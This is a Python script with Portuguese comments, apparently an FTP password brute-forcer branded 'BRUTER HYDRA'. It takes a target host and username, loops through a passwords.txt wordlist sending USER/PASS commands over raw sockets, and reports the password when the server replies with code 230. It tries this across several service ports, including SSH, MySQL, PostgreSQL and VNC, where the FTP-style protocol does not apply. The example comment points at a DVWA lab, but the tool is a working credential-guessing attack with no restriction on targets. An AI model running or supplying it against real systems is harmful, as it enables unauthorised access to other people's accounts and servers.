import socket
import re
import os
import sys
import time
from urllib.parse import urlparse

print("""

██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗     ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                               
""")

# Digite a URL completa do website:  Exemplo: http://168.158.1.1/dvwa/login.php

# Obtém o diretório do script
script_dir = os.path.dirname(os.path.abspath(__file__))

# Solicita que o usuário digite o IP, nome do website ou a URL completa do website
url = input("\nDigite o IP, nome do website ou a URL completa do website: ").strip()
print()

# Solicita que o usuário digite o nome do usuário
username = input("\nDigite o nome do usuário: ").strip()
print()

# Define o caminho completo para o arquivo passwords.txt
passwords_path = os.path.join(script_dir, "passwords.txt")

# Abre o arquivo de senhas com codificação UTF-8
try:
    with open(passwords_path, "r", encoding="latin-1") as pass_file:
        passwords = pass_file.read().splitlines()
except FileNotFoundError:
    print(f"Erro: Arquivo {passwords_path} não encontrado.")
    sys.exit(1)

# Extrai o servidor (host) da URL fornecida pelo usuário
parsed_url = urlparse(url)
server = parsed_url.hostname if parsed_url.hostname else url

# Função para formatar o tempo em minutos e segundos
def format_time(seconds):
    minutes, seconds = divmod(seconds, 60)
    return f"{int(minutes)}m {int(seconds)}s"

# Função para exibir a linha de progresso com tempo estimado para a conclusão da varredura
def show_progress(user, key, elapsed_time, total_attempts, attempts_done):
    avg_time_per_attempt = elapsed_time / attempts_done if attempts_done else 0
    estimated_total_time = avg_time_per_attempt * total_attempts

    estimated_total_time_str = format_time(estimated_total_time)    
    
    # Exibe o progresso e o tempo estimado na mesma linha
    sys.stdout.write(f"\rTestando Nome do usuário: {user} Senha: {key:<20} ====> Tempo Total Estimado: {estimated_total_time_str}")
    sys.stdout.flush()

# Função para tentar a conexão em uma porta específica
def try_port(port):
    start_time = time.time()
    total_attempts = len(passwords)
    attempts_done = 0

    for key in passwords:
        current_time = time.time()
        elapsed_time = current_time - start_time
        show_progress(username, key, elapsed_time, total_attempts, attempts_done)
        time.sleep(0.1)  # Pequena pausa para garantir que a linha seja atualizada corretamente

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # Define um tempo limite para a conexão
            s.connect((server, port))
            banner = s.recv(1024)
            s.send(f"USER {username}\r\n".encode('latin-1'))
            user_response = s.recv(1024)
            s.send(f"PASS {key}\r\n".encode('latin-1'))
            res = s.recv(1024)
            s.send("QUIT\r\n".encode('latin-1'))

            if re.search(b"230", res):
                print("\n\n\nSenha Encontrada\n================")
                print(f"usuário: {username}\nSenha: {key}")
                end_time = time.time()
                total_time = end_time - start_total_time
                print(f"\nLevou: {format_time(total_time)} para terminar a varredura")
                input("\n\n\nPRESSIONE ENTER PARA SAIR\n=========================\n\n")
                return True
        except socket.gaierror:
            print("\nErro ao resolver o nome do host. Verifique a URL e tente novamente.")
            sys.exit(1)
        except socket.timeout:
            print("\nTempo limite de conexão excedido.")
        except Exception as e:
            print(f"\nErro ao conectar ao servidor: {e}")
        finally:
            if s:
                s.close()
        
        attempts_done += 1
    return False

# Início da medição do tempo total de execução
start_total_time = time.time()

# Tenta as portas 21, 22, 23, 25, 80, 3306, 5432 e 5900
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 5900]
for port in ports:
    if try_port(port):
        sys.exit(0)

# Tempo total de execução (caso nenhuma senha seja encontrada)
end_total_time = time.time()
total_execution_time = end_total_time - start_total_time

# Exibe o tempo total de varredura
print(f"\n\nLevou: {format_time(total_execution_time)} para terminar a varredura")

print("\nNenhuma combinação de usuário e senha encontrada.")
input("\n\n\nPRESSIONE ENTER PARA SAIR\n=========================\n\n")
